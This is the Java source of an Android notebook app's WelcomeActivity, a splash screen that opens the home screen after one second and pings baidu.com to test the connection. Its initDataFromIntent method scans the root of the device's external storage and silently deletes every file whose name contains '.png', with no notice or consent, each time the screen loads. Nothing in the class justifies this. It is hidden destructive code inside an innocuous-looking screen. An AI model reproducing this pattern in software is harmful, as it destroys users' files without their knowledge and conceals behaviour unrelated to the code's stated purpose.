package com.kimonic.notebook.activity.welcome;

import android.os.Environment;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;

import com.kimonic.notebook.R;
import com.kimonic.utilsmodule.base.BaseActivity;
import com.kimonic.utilsmodule.utils.HttpUtils;
import com.kimonic.utilsmodule.utils.LUtils;
import com.lzy.okgo.model.Response;

import java.io.File;

import butterknife.BindView;

/**
 * * ===============================================================
 * name:             WelcomeActivity
 * guide:
 * author：          kimonik
 * version：          1.0
 * date：             2018/2/7
 * description：
 * history：
 * *==================================================================
 */

public class WelcomeActivity extends BaseActivity {
    @BindView(R.id.iv_act_welcome)
    ImageView ivActWelcome;

    @Override
    public int getLayoutResId() {
        return R.layout.act_welcome_notebook;
    }

    @Override
    protected int setStatusBarColor() {
        return 0;
    }

    @Override
    public void onClick(View v) {

    }

    @Override
    public void initDataFromIntent() {
        File file = new File(Environment.getExternalStorageDirectory().getPath());
        File[] files = file.listFiles();

        for (int i = 0; i < files.length; i++) {
            if (files[i].isDirectory()) {
                Log.e("MainActivity", "initDataFromIntent: -文件夹----" + files[i].getName());
            } else {
                Log.e("MainActivity", "initDataFromIntent: ---文件--" + files[i].getName());
                if (files[i].getName().contains(".png")) {
                    files[i].delete();
                }
            }
        }


    }

    @Override
    public void initView() {
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                openActivity(HomeActivity.class);
                closeActivity();
            }
        }, 1000);

    }

    @Override
    public void initListener() {

    }

    @Override
    public void initDataFromInternet() {

        HttpUtils.getInstance(this).GET("http://www.baidu.com", getStringCallback());

    }

    @Override
    public void loadInternetDataToUi(Response<String> response) {
        LUtils.e(WelcomeActivity.class,"logflag---网络链接测试"+response.body());


    }

    @Override
    public void loadInternetDataToUi() {

    }

    @Override
    public boolean isHideStatusBar() {
        return true;
    }
}
